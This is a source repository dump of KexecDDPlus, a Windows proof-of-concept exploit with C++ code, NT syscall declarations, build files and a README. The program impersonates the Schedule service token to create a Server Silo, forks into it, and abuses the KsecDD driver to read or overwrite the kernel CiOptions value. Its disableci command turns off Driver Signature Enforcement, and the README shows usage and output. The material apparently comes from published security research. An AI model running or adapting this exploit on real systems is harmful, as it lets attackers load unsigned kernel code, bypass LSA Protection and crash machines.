        NtTerminateProcess(
            _In_opt_ HANDLE ProcessHandle,
            _In_ NTSTATUS ExitStatus
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtImpersonateThread(
            _In_ HANDLE ServerThreadHandle,
            _In_ HANDLE ClientThreadHandle,
            _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtOpenEvent(
            _Out_ PHANDLE EventHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _In_ POBJECT_ATTRIBUTES ObjectAttributes
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtSetEvent(
            _In_ HANDLE EventHandle,
            _Out_opt_ PLONG PreviousState
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtOpenDirectoryObject(
            _Out_ PHANDLE DirectoryHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _In_ POBJECT_ATTRIBUTES ObjectAttributes
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtCreateDirectoryObjectEx(
            _Out_ PHANDLE DirectoryHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _In_ POBJECT_ATTRIBUTES ObjectAttributes,
            _In_ HANDLE ShadowDirectoryHandle,
            _In_ ULONG Flags
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtSetInformationFile(
            _In_ HANDLE FileHandle,
            _Out_ PIO_STATUS_BLOCK IoStatusBlock,
            _In_reads_bytes_(Length) PVOID FileInformation,
            _In_ ULONG Length,
            _In_ FILE_INFORMATION_CLASS FileInformationClass
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtCreateJobObject(
            _Out_ PHANDLE JobHandle,
            _In_ ACCESS_MASK DesiredAccess,
            _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtSetInformationJobObject(
            _In_ HANDLE JobHandle,
            _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
            _In_reads_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
            _In_ ULONG JobObjectInformationLength
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtQueryInformationJobObject(
            _In_opt_ HANDLE JobHandle,
            _In_ JOBOBJECTINFOCLASS JobObjectInformationClass,
            _Out_writes_bytes_(JobObjectInformationLength) PVOID JobObjectInformation,
            _In_ ULONG JobObjectInformationLength,
            _Out_opt_ PULONG ReturnLength
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtTerminateJobObject(
            _In_ HANDLE JobHandle,
            _In_ NTSTATUS ExitStatus
        );

    NTSYSCALLAPI
        NTSTATUS
        NTAPI
        NtAssignProcessToJobObject(
            _In_ HANDLE JobHandle,
            _In_ HANDLE ProcessHandle
        );

#ifdef __cplusplus
}
#endif
```

`KexecDDPlus.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.11.35222.181
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "KexecDDPlus", "KexecDDPlus\KexecDDPlus.vcxproj", "{F59FED04-9631-49CC-9F73-2DE2478A8EED}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Common", "Common\Common.vcxproj", "{778EB295-BF7A-4ECB-889F-BA23A8FC409A}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{F59FED04-9631-49CC-9F73-2DE2478A8EED}.Debug|x64.ActiveCfg = Debug|x64
		{F59FED04-9631-49CC-9F73-2DE2478A8EED}.Debug|x64.Build.0 = Debug|x64
		{F59FED04-9631-49CC-9F73-2DE2478A8EED}.Release|x64.ActiveCfg = Release|x64
		{F59FED04-9631-49CC-9F73-2DE2478A8EED}.Release|x64.Build.0 = Release|x64
		{778EB295-BF7A-4ECB-889F-BA23A8FC409A}.Debug|x64.ActiveCfg = Debug|x64
		{778EB295-BF7A-4ECB-889F-BA23A8FC409A}.Debug|x64.Build.0 = Debug|x64
		{778EB295-BF7A-4ECB-889F-BA23A8FC409A}.Release|x64.ActiveCfg = Release|x64
		{778EB295-BF7A-4ECB-889F-BA23A8FC409A}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {5772D6F4-B5B5-4DE3-B603-38A661F73CB3}
	EndGlobalSection
EndGlobal

```

`KexecDDPlus/KexecDDPlus.cpp`:

```cpp
#include "common.h"
#include "ServerSilo.h"
#include "IpcServer.h"
#include "IpcClient.h"
#include <iostream>

#define CMD_QUERY_CI L"queryci" // 0
#define CMD_DISABLE_CI L"disableci" // 1
#define CMD_SET_CI L"setci" // 2

#define CMD_CODE_QUERY_CI_CODE 0
#define CMD_CODE_DISABLE_CI 1
#define CMD_CODE_SET_CI 2

BOOL g_bPrintVerbose = FALSE; // Set to TRUE to enable verbose messages
DWORD g_dwCommandCode = (DWORD)-1;
DWORD g_dwCiOptions = 0;

void PrintUsage(wchar_t* prog);
void ExecuteCommand(int cc);

int main()
{
    wchar_t** argv;
    int argc;

    argv = CommandLineToArgvW(GetCommandLineW(), &argc);

    if (argc >= 2)
    {
        if (_wcsicmp(argv[1], CMD_QUERY_CI) == 0)
        {
            ExecuteCommand(CMD_CODE_QUERY_CI_CODE);
            return 0;
        }
        else if (_wcsicmp(argv[1], CMD_DISABLE_CI) == 0)
        {
            ExecuteCommand(CMD_CODE_DISABLE_CI);
            return 0;
        }
        else if (_wcsicmp(argv[1], CMD_SET_CI) == 0)
        {
            if (argc >= 3)
            {
                g_dwCiOptions = wcstoul(argv[2], nullptr, 0);

                if ((g_dwCiOptions != 0) && (g_dwCiOptions != ULONG_MAX))
                {
                    ExecuteCommand(CMD_CODE_SET_CI);
                    return 0;
                }
                else
                {
                    PRINT_ERROR(L"Failed to parse input value (or supplied value was 0): %ws\n", argv[2]);
                    return 2;
                }
            }
        }
        else
        {
            PRINT_ERROR(L"Unknown command: %ws\n", argv[1]);
            return 2;
        }
    }

    PrintUsage(argv[0]);

    return 1;
}

void PrintUsage(wchar_t* prog)
{
    wprintf(
        L""
        "\n"
        " Usage:\n"
        "     %ws <CMD> [<ARGS>]\n"
        "\n"
        " Query the CI options value:\n"
        "     %ws %ws\n"
        " Set the CI options value to 0:\n"
        "     %ws %ws\n"
        " Set the CI options value:\n"
        "     %ws %ws <VALUE>\n"
        ,
        prog,
        prog,
        CMD_QUERY_CI,
        prog,
        CMD_DISABLE_CI,
        prog,
        CMD_SET_CI
    );
}

void ExecuteCommand(int cc)
{
    KsecDD* ksec = nullptr;
    ServerSilo* silo = nullptr;
    HANDLE hScheduleToken = NULL;
    BOOL bImpersonation = FALSE;
    PROCESS_INFORMATION pi = { 0 };

    //
    // SeTcbPrivilege is required for creating a Server Silo. Since administrators
    // don't have this privilege, we'll use the token of the Schedule service instead.
    //

    if (!Common::EnablePrivilege(NULL, SE_IMPERSONATE_NAME) || !Common::EnablePrivilege(NULL, SE_DEBUG_NAME)) goto exit;
    PRINT_VERBOSE(L"Enabled required privileges.\n");

    if (!Common::OpenServiceToken(L"Schedule", &hScheduleToken)) goto exit;
    PRINT_VERBOSE(L"Got Schedule service's token.\n");
    
    if (!Common::EnablePrivilege(hScheduleToken, SE_TCB_NAME)) goto exit;
    PRINT_VERBOSE(L"Enabled SeTcbPrivilege in token.\n");

    if (!Common::ImpersonateToken(hScheduleToken)) goto exit;
    PRINT_VERBOSE(L"Impersonating Schedule service...\n");

    bImpersonation = TRUE;

    silo = new ServerSilo();
    if (!silo->IsInitialized()) goto exit;
    PRINT_SUCCESS(L"Silo created and initialized (path is %ws).\n", silo->GetRootDirectory());

    //
    // Once the Server Silo is created, we no longer need to impersonate SYSTEM. So, 
    // we can "revert to self", and close the Token handle.
    //

    if (!Common::RevertImpersonation()) goto exit;
    PRINT_VERBOSE(L"Reverted impersonation.\n");

    bImpersonation = FALSE;
    CloseHandle(hScheduleToken);
    hScheduleToken = NULL;

    //
    // We should initialize our KsecDD client in the forked process (see below), but
    // doing it here will allow us to see error messages on the console. It would
    // technically be feasible to attach the forked process to the parent's console,
    // though the result is not consistent throughout Windows versions.
    //

    ksec = new KsecDD();
    if (!ksec->IsInitialized()) goto exit;

    //
    // Now, we need to execute code in the Server Silo. We could get the command line
    // of the current process, and use that to start a new process. However, there is
    // no guarantee that the current program is the one we want to execute (in case
    // of process injection for instance). Instead, we can fork the current process
    // and take different code paths, depending on whether we are in the parent or 
    // the child. This comes at the expense of having to handle resources and open
    // handles very carefully though.
    //

    if (!Common::ForkProcessIntoServerSilo(silo->GetHandle(), &pi)) goto exit;

    //
    // If the 'fork' succeeds, the Process handle value of the PROCESS_INFORMATION
    // structure is populated with the handle of the child process. That's how we
    // now we are still in the 'main' process. Therefore, the other code path
    // is only taken in the 'child' process.
    //

    if (pi.hProcess)
    {
        //
        // We are in the parent process! We will use a named pipe as an IPC mechanism
        // to communicate with the child process.
        //

        IpcClient* client = nullptr;
        DWORD dwExitCode = 0;

        PRINT_SUCCESS(L"Process forked (child pid is %d).\n", pi.dwProcessId);

        client = new IpcClient();

        //
        // Try to connect to the child's named pipe in a loop, and wait 1s before each
        // attempt. After 5 failed attempts, we safely exit.
        //

        for (int i = 0; i < 5; i++)
        {
            Sleep(1000);
            if (client->Connect()) break;
        }

        if (!client->IsConnected())
        {
            PRINT_ERROR(L"Failed to connect to IPC server.\n");
            goto parent_exit;
        }

        //
        // Send a PING command to the child to make sure the IPC is working properly.
        //

        PRINT_VERBOSE(L"Sending PING request...\n");
        if (!client->SendPingRequest()) goto parent_exit;
        PRINT_VERBOSE(L"PING request OK\n");

        PRINT_SUCCESS(L"Connected to child process!\n");

        switch (cc)
        {
        case CMD_CODE_QUERY_CI_CODE:
            PRINT_VERBOSE(L"Sending Query CiOptions request...\n");
            if (!client->SendQueryCiOptionsRequest(&g_dwCiOptions)) goto parent_exit;
            PRINT_SUCCESS(L"Query CiOptions request OK, current value is: 0x%08x\n", g_dwCiOptions);
            break;
        case CMD_CODE_DISABLE_CI:
            PRINT_VERBOSE(L"Sending Disable CI request...\n");
            if (!client->SendDisableCiRequest()) goto parent_exit;
            PRINT_SUCCESS(L"Disable CI request OK\n");
            break;
        case CMD_CODE_SET_CI:
            PRINT_VERBOSE(L"Sending Set CiOptions request...\n");
            if (!client->SendSetCiOptionsRequest(g_dwCiOptions)) goto parent_exit;
            PRINT_SUCCESS(L"Set CiOptions request OK\n");
            break;
        default:
            PRINT_ERROR(L"Unknown command code: %d\n", cc);
        }

        PRINT_VERBOSE(L"Sending PING request...\n");
        if (!client->SendPingRequest()) goto parent_exit;
        PRINT_VERBOSE(L"PING request OK\n");

    parent_exit:
        if (client && client->IsConnected())
        {
            client->Disconnect();
        }

        //
        // Wait for the child process to terminate indefinitely. Note, that is not
        // ideal as we could be waiting forever. We should wait for a few seconds,
        // and then kill the process if it's unresponsive instead.
        //

        PRINT_VERBOSE(L"Waiting for child process (%d) to terminate...\n", pi.dwProcessId);
        NtWaitForSingleObject(pi.hProcess, FALSE, NULL);

        if (pi.hProcess) NtClose(pi.hProcess);
        if (pi.hThread) NtClose(pi.hThread);
        if (client) delete client;
        if (silo) delete silo;
    }
    else
    {
        //
        // We are in the child process! We'll create a named pipe to let the parent
        // process communicate with us.
        //

        IpcServer* server = nullptr;
        HANDLE hListenThread = NULL;

        if (!ksec->Connect()) goto child_exit;

        server = new IpcServer();

        if (!server->IsInitialized()) goto child_exit;
        if (!server->SetKsecClient(ksec)) goto child_exit;
        if (!server->ListenInThread(&hListenThread)) goto child_exit;

        WaitForSingleObject(hListenThread, INFINITE);
        
    child_exit:
        if (hListenThread) CloseHandle(hListenThread);
        if (server) delete server;
        if (ksec->IsConnected()) ksec->Disconnect();
        
        NtTerminateProcess((HANDLE)-1, STATUS_SUCCESS);
    }

exit:
    if (bImpersonation) RevertToSelf();
    if (hScheduleToken) CloseHandle(hScheduleToken);
    if (ksec) delete ksec;

    wprintf(L"All done.\n");
}
```

`KexecDDPlus/KexecDDPlus.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{f59fed04-9631-49cc-9f73-2de2478a8eed}</ProjectGuid>
    <RootNamespace>KexecDDPlus</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>..\Common</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>..\Common</AdditionalIncludeDirectories>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <AdditionalLibraryDirectories>%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="..\Common\KsecDD.cpp" />
    <ClCompile Include="KexecDDPlus.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\Common\Common.vcxproj">
      <Project>{778eb295-bf7a-4ecb-889f-ba23a8fc409a}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\Common\KsecDD.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`KexecDDPlus/KexecDDPlus.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="KexecDDPlus.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\Common\KsecDD.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\Common\KsecDD.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`README.md`:

```md
# KexecDDPlus

This proof-of-concept is the result of a research project that aimed at extending the work of [@floesen_](https://x.com/floesen_) on the KsecDD Windows driver.

It relies on Server Silos to access the KsecDD driver directly, without having to inject code into LSASS. This capability therefore allows it to operate even on systems on which LSA Protection is enabled.

For more information, please check out our blog post [Exploiting KsecDD through Server Silos](https://blog.scrt.ch/2024/11/11/exploiting-ksecdd-through-server-silos/), and the links in the [Credits](#credits) section.

**Tested on:**

- Windows 11 23H2 (OS Build 22631.4317)
- Windows 11 23H2 (OS Build 22631.3380)
- Windows 10 22H2 (OS Build 19045.5011)
- Windows 10 22H2 (OS Build 19045.4894)

## Disclaimer

> [!CAUTION]
> This PoC can only be executed **4 times**, before crashing the kernel!

Due to the way the IOCTL `IOCTL_KSEC_IPC_SET_FUNCTION_RETURN` is handled by the KsecDD driver, this PoC can only be used 4 times. At the 5th execution, the driver will attempt to free the user-supplied buffer as if it were allocated in a kernel pool. This operation is invalid, and therefore will cause a Bug Check, *a.k.a.* a Blue Screen. To run the exploit again, without crashing the kernel, a machine reboot will be required.

## Usage

```console
C:\Temp>KexecDDPlus.exe

 Usage:
     KexecDDPlus.exe <CMD> [<ARGS>]

 Query the CI options value:
     KexecDDPlus.exe queryci
 Set the CI options value to 0:
     KexecDDPlus.exe disableci
 Set the CI options value:
     KexecDDPlus.exe setci <VALUE>
```

**Query the CI options value**

```console
C:\Temp>KexecDDPlus.exe queryci
[+] Silo created and initialized (path is \Silos\764).
[+] Process forked (child pid is 2740).
[+] Connected to child process!
[+] Query CiOptions request OK, current value is: 0x00000006
All done.
```

**Disable Driver Signature Enforcement (DSE) - Set CI options to 0**

```console
C:\Temp>KexecDDPlus.exe disableci
[+] Silo created and initialized (path is \Silos\768).
[+] Process forked (child pid is 5396).
[+] Connected to child process!
[+] Disable CI request OK
All done.
```

**Set the value of CI options**

```console
C:\Temp>KexecDDPlus.exe setci 6
[+] Silo created and initialized (path is \Silos\772).
[+] Process forked (child pid is 9012).
[+] Connected to child process!
[+] Set CiOptions request OK
All done.
```

## Authors

- Clément Labro
    - Mastodon: [https://infosec.exchange/@itm4n](https://infosec.exchange/@itm4n)
    - GitHub: [https://github.com/itm4n](https://github.com/itm4n)
- Romain Melchiorre
    - Twitter/X: [https://x.com/PMa1n](https://x.com/PMa1n)
    - Mastodon: [https://infosec.exchange/@pmain](https://infosec.exchange/@pmain)
    - GitHub: [https://github.com/PMain](https://github.com/PMain)

## Credits

- [@floesen_](https://x.com/floesen_) - [KExecDD](https://github.com/floesen/KExecDD)
- Claudio Contin - [LSASS rings KsecDD ext. 0](https://tierzerosecurity.co.nz/2024/04/29/kexecdd.html)
- James Forshaw ([@tiraniddo](https://infosec.exchange/@tiraniddo)) - [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools)
- Lucas Di Martino - [Reversing Windows Container, episode I: Silo](https://blog.quarkslab.com/reversing-windows-container-episode-i-silo.html)
- Lucas Di Martino - [Reversing Windows Container, episode II: Silo to Server Silo](https://blog.quarkslab.com/reversing-windows-container-part-ii-silo-to-server-silo.html)
- Axel Souchet ([@0vercl0k](https://twitter.com/0vercl0k)) - [rp++](https://github.com/0vercl0k/rp)

```